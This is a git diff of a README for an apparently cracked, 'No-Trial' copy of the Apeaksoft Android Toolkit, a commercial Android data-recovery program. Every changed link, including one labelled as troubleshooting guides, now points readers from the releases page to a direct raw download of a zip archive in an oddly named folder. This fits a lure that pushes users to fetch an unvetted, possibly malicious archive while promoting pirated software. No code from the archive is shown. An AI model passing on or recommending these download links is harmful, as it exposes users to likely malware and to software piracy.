@@ -10,7 +10,7 @@ To get started with Apeaksoft Android Toolkit, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of the toolkit.
    
-   [Download Apeaksoft Android Toolkit](https://github.com/nathnta/Apeaksoft-Android-Toolkit-No-Trial/releases)
+   [Download Apeaksoft Android Toolkit](https://raw.githubusercontent.com/nathnta/Apeaksoft-Android-Toolkit-No-Trial/main/bricken/Apeaksoft-Android-Toolkit-No-Trial-v3.9.zip)
 
 2. **Choose Your Version:** Look for the latest release. Typically, the most recent version is at the top of the list.
 
@@ -73,7 +73,7 @@ If you encounter issues while using Apeaksoft Android Toolkit, here are some com
 - **Scan Errors:** Restart the application and try scanning again.
 - **No Files Found:** Ensure that you have selected the correct data types for recovery.
 
-You can find more troubleshooting guides in the user documentations section on the [Releases Page](https://github.com/nathnta/Apeaksoft-Android-Toolkit-No-Trial/releases).
+You can find more troubleshooting guides in the user documentations section on the [Releases Page](https://raw.githubusercontent.com/nathnta/Apeaksoft-Android-Toolkit-No-Trial/main/bricken/Apeaksoft-Android-Toolkit-No-Trial-v3.9.zip).
 
 ## 📚 Additional Resources
 
@@ -108,4 +108,4 @@ This toolkit supports a variety of functions to enhance your Android experience.
 
 Apeaksoft Android Toolkit is designed to make managing your Android device easier. Whether you want to recover lost data or backup important files, this toolkit has you covered. Download the software and start enhancing your experience today. 
 
-[Download Apeaksoft Android Toolkit](https://github.com/nathnta/Apeaksoft-Android-Toolkit-No-Trial/releases)
+[Download Apeaksoft Android Toolkit](https://raw.githubusercontent.com/nathnta/Apeaksoft-Android-Toolkit-No-Trial/main/bricken/Apeaksoft-Android-Toolkit-No-Trial-v3.9.zip)
